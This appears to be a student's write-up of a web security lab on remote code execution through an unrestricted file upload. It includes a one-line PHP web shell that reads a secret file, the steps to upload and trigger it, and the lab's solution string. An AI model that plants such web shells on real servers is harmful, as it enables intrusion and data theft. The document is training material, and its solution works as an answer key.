### Lab: Remote code execution via web shell upload
---
#### Objective: Upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. 
**Solving Steps**   
I created a payload php file 'lab-11-payload.php', located in /payloads. The payload contains the code:
```php
<?php echo file_get_contents('/home/carlos/secret'); ?> 
```
This code gets the content of the file at the target location. I was able to successfully upload the php file as my banner without any restriction. After this, I go to the Dev Console and opened the networks tab, refreshing the page so the code gets executed and look at the response.  

The response contains the secret located at the target directory which solves the lab.
**Solution**
```
C1rwrLVwxs7UqOwUPwKcTwIVw7LWmeET
```